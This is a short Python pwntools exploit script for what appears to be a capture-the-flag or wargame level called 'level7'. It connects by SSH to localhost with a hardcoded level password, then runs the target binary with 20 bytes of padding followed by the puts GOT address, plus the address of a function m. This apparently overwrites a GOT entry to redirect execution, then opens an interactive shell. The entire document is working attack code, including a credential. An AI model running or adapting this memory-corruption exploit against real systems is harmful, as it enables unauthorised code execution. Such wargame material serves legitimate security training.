#!/usr/bin/env python

from pwn import *

host = "127.0.0.1"
port = 4242

login = "level7" 
binary = login
password = "f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d" 


remotebinary = "/home/user/%s/%s" % (login, binary)

shell = ssh(host=host, port=port, user=login, password=password)

### Exploit ###

padding = 20 * b"A"
puts_address = p32(0x08049928)
m_address    = p32(0x080484f4)

arg1 = padding + puts_address

arg2 = m_address


p = shell.process([remotebinary, arg1, arg2], env={})

# p.clean()

p.interactive()